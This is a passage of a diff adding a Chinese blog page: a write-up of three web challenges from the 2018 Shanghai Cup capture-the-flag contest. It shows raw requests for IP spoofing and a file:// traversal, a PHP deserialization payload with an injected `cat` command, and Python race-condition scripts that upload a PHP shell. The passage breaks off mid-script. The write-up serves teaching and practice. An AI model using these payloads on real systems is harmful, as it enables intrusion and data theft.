@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="【SourceCode的部分WP】 WEB-1题目：what are you doing? 访问web1链接出现what are you doing? 常规思路看一下网站源码，发现有robots.txt 1what are you doing?&amp;lt;br /&amp;gt; &amp;lt;!--  you need to visit to robots.txt  --&amp;gt; 我们访问robots.txt发现">
+<meta name="keywords" content="WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018上海杯WP">
+<meta property="og:url" content="http://yoursite.com/2018/11/05/上海杯WP/index.html">
+<meta property="og:site_name" content="锯沫的小窝">
+<meta property="og:description" content="【SourceCode的部分WP】 WEB-1题目：what are you doing? 访问web1链接出现what are you doing? 常规思路看一下网站源码，发现有robots.txt 1what are you doing?&amp;lt;br /&amp;gt; &amp;lt;!--  you need to visit to robots.txt  --&amp;gt; 我们访问robots.txt发现">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.5am3.com/img/181104/f5KjLa2ajd.png">
+<meta property="og:image" content="http://img.5am3.com/img/181104/leFK2j24D3.png">
+<meta property="og:image" content="http://img.5am3.com/img/181104/fH5gJ7FJ81.png">
+<meta property="og:image" content="http://img.5am3.com/img/181104/kAE751Fcd4.png">
+<meta property="og:image" content="http://img.5am3.com/img/181104/lhL8fkImIH.png">
+<meta property="og:image" content="http://img.5am3.com/img/181104/9kDhhLk9b3.png?imageslim">
+<meta property="og:updated_time" content="2018-11-05T12:19:13.380Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018上海杯WP">
+<meta name="twitter:description" content="【SourceCode的部分WP】 WEB-1题目：what are you doing? 访问web1链接出现what are you doing? 常规思路看一下网站源码，发现有robots.txt 1what are you doing?&amp;lt;br /&amp;gt; &amp;lt;!--  you need to visit to robots.txt  --&amp;gt; 我们访问robots.txt发现">
+<meta name="twitter:image" content="http://img.5am3.com/img/181104/f5KjLa2ajd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/05/上海杯WP/"/>
+
+
+
+
+
+  <title>2018上海杯WP | 锯沫的小窝</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://ch3nie.github.io/"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_white_ffffff.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">锯沫的小窝</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-search">
+          <a href="/search" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/05/上海杯WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="句末">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/blog-logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="锯沫的小窝">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2018上海杯WP</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-05T20:17:30+08:00">
+                2018-11-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>【SourceCode的部分WP】</p>
+<h1 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB-1"></a>WEB-1</h1><p>题目：what are you doing?</p>
+<p>访问web1链接出现what are you doing? 常规思路看一下网站源码，发现有robots.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">what are you doing?&lt;br /&gt; &lt;!--  you need to visit to robots.txt  --&gt;</span><br></pre></td></tr></table></figure>
+<p>我们访问robots.txt发现有两个php文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">source.php</span><br><span class="line">flag.php</span><br></pre></td></tr></table></figure>
+<p>访问flag.php是一个空白页面，访问source.php回显you need to login as admin!我们查看source.php的源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  &apos;admin&apos; --&gt;</span><br></pre></td></tr></table></figure>
+<p>嗯，我们需要用admin身份登陆，post过去admin=1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  &apos;admin&apos; --&gt;only 127.0.0.1 can get the flag!!</span><br></pre></td></tr></table></figure>
+<p>我们需要用127.0.0.1去访问，我们在请求头里添加x-client-ip:127.0.0.1，然后再去发包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  &apos;admin&apos; --&gt;you need post url: http://www.ichunqiu.com</span><br></pre></td></tr></table></figure>
+<p>根据提示我们post过去下面的数据，发现会返回一个图片地址，但这个图片无法显示，我们把图片下载下来，会发现他是html，而且i春秋的主页</p>
+<p><img src="http://img.5am3.com/img/181104/f5KjLa2ajd.png" alt="mark"></p>
+<p>到这里其实卡了半天，在‘’url=<a href="https://www.ichunqiu.com+路径会得到该路径的网页源码，尝试拼接url然后下载flag.php的源码，但是拼接半天未果。还是队友后来想到了直接跳转目录，访问本地文件flag.php，然后把返回的该图片载下来，就是flag.php的源码,payload如下" target="_blank" rel="noopener">https://www.ichunqiu.com+路径会得到该路径的网页源码，尝试拼接url然后下载flag.php的源码，但是拼接半天未果。还是队友后来想到了直接跳转目录，访问本地文件flag.php，然后把返回的该图片载下来，就是flag.php的源码,payload如下</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/source.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: a5c3e1b00225407882f0c49146799bc7264bdbab35e64bc6.game.ichunqiu.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">x-client-ip:127.0.0.1</span></span><br><span class="line"><span class="attribute">Referer</span>: http://a5c3e1b00225407882f0c49146799bc7264bdbab35e64bc6.game.ichunqiu.com/source.php</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 63</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Cookie</span>: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1541299543; UM_distinctid=16554da401239b-0683daa189f84b-4c312878-144000-16554da401358; pgv_pvi=8097842176; ci_session=b34f5f4fa25e7d36b3c6f0d3efae40f090604014; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; pgv_si=s5565527040; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1541318560; Hm_lvt_9104989ce242a8e03049eaceca950328=1541299549; Hm_lpvt_9104989ce242a8e03049eaceca950328=1541299549; Hm_lvt_1a32f7c660491887db0960e9c314b022=1541299549; Hm_lpvt_1a32f7c660491887db0960e9c314b022=1541299549</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">admin=1&amp;url=file://www.ichunqiu.com/../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.5am3.com/img/181104/leFK2j24D3.png" alt="mark"></p>
+<p>最后拿到把图片改成php文件，拿到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;flag&#123;2ca93a96-39e3-48c9-9377-fd79a9f1c40b&#125;&quot;;</span><br></pre></td></tr></table></figure>
+<h1 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h1><p>题目：Can you hack me?</p>
+<p>这个题是个.swp的文件泄露,我们把.swp文件下载下来进行源码审计</p>
+<p><img src="http://img.5am3.com/img/181104/fH5gJ7FJ81.png" alt="mark"></p>
+<p>.swp文件需要在linux下用vi -r index.php.swp来恢复文件</p>
+<p>然后开始代码审计········</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class come&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args) &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        foreach($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)&#123;</span><br><span class="line">        $str=preg_replace(&quot;/[&lt;&gt;*;|?\n ]/&quot;,&quot;&quot;,$str);</span><br><span class="line">        $str=str_replace(&apos;flag&apos;,&apos;&apos;,$str);</span><br><span class="line">        return $str;</span><br><span class="line">    &#125;</span><br><span class="line">    function echo($host)&#123;</span><br><span class="line">        system(&quot;echo $host&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;echo&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$first=&apos;hi&apos;;</span><br><span class="line">$var=&apos;var&apos;;</span><br><span class="line">$bbb=&apos;bbb&apos;;</span><br><span class="line">$ccc=&apos;ccc&apos;;</span><br><span class="line">$i=1;</span><br><span class="line">foreach($_GET as $key =&gt; $value) &#123;</span><br><span class="line">        if($i===1)</span><br><span class="line">        &#123;</span><br><span class="line">            $i++;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">if($first===&quot;doller&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str($_GET[&apos;a&apos;]);</span><br><span class="line">    if($var===&quot;give&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        if($bbb===&quot;me&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            if($ccc===&quot;flag&quot;)</span><br><span class="line">            &#123;</span><br><span class="line">                echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;;</span><br><span class="line">                $come=@$_POST[&apos;come&apos;];</span><br><span class="line">                unserialize($come);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;NO&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Can you hack me?&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过分析代码我们可以知道要先get参数绕过然后执行反序列化，get参数绕过如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?first=doller&amp;a=var%3dgive%26bbb%3dme%26ccc%3dflag</span><br></pre></td></tr></table></figure>
+<p>然后开始思考绕过反序列化，根据题目代码得知，__wakeup方法执行了一个过滤字符的waf。所以需要利用谷歌发现的CVE-2016-7124漏洞，当序列化的字符串中，如果表示对象属性的个数的值大于真实的属性个数就会跳过wakeup的执行。 可是发现本地测试可以通过，远程却不可以。。。。难受了，开始代码审计，发现没有过滤斜杠，而空格可以使用$IFS绕过，同时通过学习参考链接：</p>
+<p><a href="https://www.knowsec.net/archives/341/" target="_blank" rel="noopener">https://www.knowsec.net/archives/341/</a></p>
+<p><a href="https://blog.csdn.net/qq_42196196/article/details/81217375?utm_source=blogkpcl1" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375?utm_source=blogkpcl1</a></p>
+<p>于是payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /?first=doller&amp;a=var%3dgive%26bbb%3dme%26ccc%3dflag HTTP/1.1</span><br><span class="line">Host: f927629d24dd4e0b84ef5e917d89dba041b03b9deb3641d9.game.ichunqiu.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 127</span><br><span class="line"></span><br><span class="line">come=O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:4:&quot;echo&quot;;s:10:&quot;%00come%00args&quot;;a:2:&#123;i:0;s:18:&quot;`cat$IFS/flflagag`&quot;;i:1;s:3:&quot;hjj&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="web-3"><a href="#web-3" class="headerlink" title="web-3"></a>web-3</h1><p>打开题目，直接给了源码。</p>
+<p>竞争上传shell</p>
+<p>poc1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://1f59ccd88b9d491db1b14abc6ff8642bbb50265d149e41f1.game.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># url="http://web3.shb.5am3"</span></span><br><span class="line"></span><br><span class="line">    file_name = <span class="string">"file"</span></span><br><span class="line"></span><br><span class="line">    file_upload_name = <span class="string">"5am3.php"</span></span><br><span class="line"></span><br><span class="line">    f= open(<span class="string">"5am3.php"</span>,<span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">"file[1]"</span>:<span class="string">"aaa"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">"file[]"</span>:<span class="string">"php"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">"hehe"</span>:<span class="string">"http://test2.5am3.com/test.php"</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file=&#123;</span><br><span class="line"></span><br><span class="line">        file_name: (file_upload_name, f),</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("2")</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        req=requests.post(url, data, files=file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(req.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"@"</span> <span class="keyword">in</span> req.text):</span><br><span class="line"></span><br><span class="line">    	    print(<span class="string">"crack ok!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">   	    <span class="keyword">print</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(threadNumber=<span class="number">5</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    threads=[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">120</span>,<span class="number">121</span>):</span><br><span class="line"></span><br><span class="line">        threads.append(threading.Thread(target=send,args=(num,)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line"></span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (len(threading.enumerate()) &lt; threadNumber):</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    crack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># send(111)</span></span><br></pre></td></tr></table></figure>
+<p>poc2</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">    url=<span class="string">"http://1f59ccd88b9d491db1b14abc6ff8642bbb50265d149e41f1.game.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># url="http://web3.shb.5am3"</span></span><br><span class="line"></span><br><span class="line">    file_name = <span class="string">"file"</span></span><br><span class="line"></span><br><span class="line">    file_upload_name = <span class="string">"5am3.php"</span></span><br><span class="line"></span><br><span class="line">    f= open(<span class="string">"5am32.php"</span>,<span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">    data=&#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">"file[1]"</span>:<span class="string">"aaa"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">"file[]"</span>:<span class="string">"php"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="string">"hehe"</span>:str(num)+<span class="string">".php"</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file=&#123;</span><br><span class="line"></span><br><span class="line">        file_name: (file_upload_name, f),</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("2")</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        req=requests.post(url, data, files=file)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(req.text)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">"@"</span> <span class="keyword">in</span> req.text):</span><br><span class="line"></span><br><span class="line">    	    print(<span class="string">"crack ok!"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">   	    <span class="keyword">print</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack</span><span class="params">(threadNumber=<span class="number">20</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">    threads=[]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">900</span>):</span><br><span class="line"></span><br><span class="line">        